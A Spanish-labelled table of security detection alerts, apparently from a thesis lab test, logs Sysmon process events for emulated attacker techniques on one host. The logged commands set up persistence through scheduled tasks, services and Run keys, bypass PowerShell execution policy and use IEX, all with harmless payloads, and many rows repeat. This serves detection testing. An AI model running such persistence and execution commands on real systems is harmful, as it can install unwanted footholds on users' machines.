Alertas / detecciones VR normalizadas														
Filas CLIENT_EVENT reales dentro de ventana canonica. JSONL/Discord no equivalen a deteccion.														
														
timestamp	profile	TEC	MITRE	IOA_DetectionName	Artifact	host	source	raw_evidence	campana	tipo_campana	validacion	EventID	SignalType	source_file
2026-06-24T12:50:22.696Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.788Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.945Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:31.999Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.551Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.696Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.788Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.945Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:31.999Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.261Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.261Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.544Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.240Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.196Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.226Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.544Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.240Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.196Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.226Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:18.149Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /query /tn "TFM-TEC-003" /v /fo list	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.462Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.558Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.653Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:36.343Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.772Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:18.149Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /query /tn "TFM-TEC-003" /v /fo list	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.462Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.558Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.653Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:36.343Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.772Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:54.291Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe qc "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.186Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe start "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.249Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:00.085Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:54.291Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe qc "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.186Z	P4	TEC-002	T1059.003	Windows Command Shell suspicious execution - basic profile v2	CU002_Source_TEC002_CMD_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe start "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU002_Source_TEC002_CMD_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
